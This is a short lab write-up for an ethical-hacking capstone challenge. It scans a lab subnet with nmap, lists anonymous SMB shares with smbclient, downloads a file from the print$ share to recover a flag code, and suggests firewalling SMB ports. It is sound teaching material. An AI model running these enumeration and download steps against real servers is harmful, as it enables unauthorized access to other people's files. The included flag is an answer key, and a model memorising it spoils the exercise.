#Challenge 3: Exploiting Open SMB Server Shares

##Overview
This document outlines the steps to complete Challenge 3 of the Cisco Ethical Hacker Capstone Project. The objective is to identify and exploit open SMB server shares on the 10.6.6.0/24 network, locate the taxes.txt file in the print$ share, extract the code A9!15wa2, and propose remediation strategies.
Prerequisites

##Tools: nmap, smbclient.
Network: Access to 10.6.6.0/24 for scanning.

##Steps
Step 1: Scan for SMB Hosts
Objective
Identify hosts running SMB services on the 10.6.6.0/24 network.
Command
nmap -p 139,445 10.6.6.0/24

Result
Host 10.6.6.23 has port 445 open, indicating SMB services.

##Step 2: Enumerate SMB Shares
Objective
List shares on 10.6.6.23 accessible anonymously.
Command
smbclient -L //10.6.6.23 -N

Output
Sharename       Type      Comment
---------       ----      -------
homes           Disk      All home directories
workfiles       Disk      Confidential Workfiles
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (Samba 4.9.5-Debian)

Analysis

print$ and IPC$ are accessible without authentication.
homes and workfiles likely require credentials.

##Step 3: Access and Download the File
Objective
Connect to the print$ share, locate taxes.txt, and extract the code.
Commands

Connect to print$:smbclient //10.6.6.23/print$ -N


Inside smbclient:ls
get taxes.txt
exit


Inspect locally:cat taxes.txt



Result

taxes.txt is found in print$.
Contents: A9!15wa2.

##Step 4: Propose Remediation
Objective
Suggest methods to secure the SMB server.
Recommendations

Restrict Access:
Use firewall rules to limit SMB ports (139, 445) to trusted IPs.
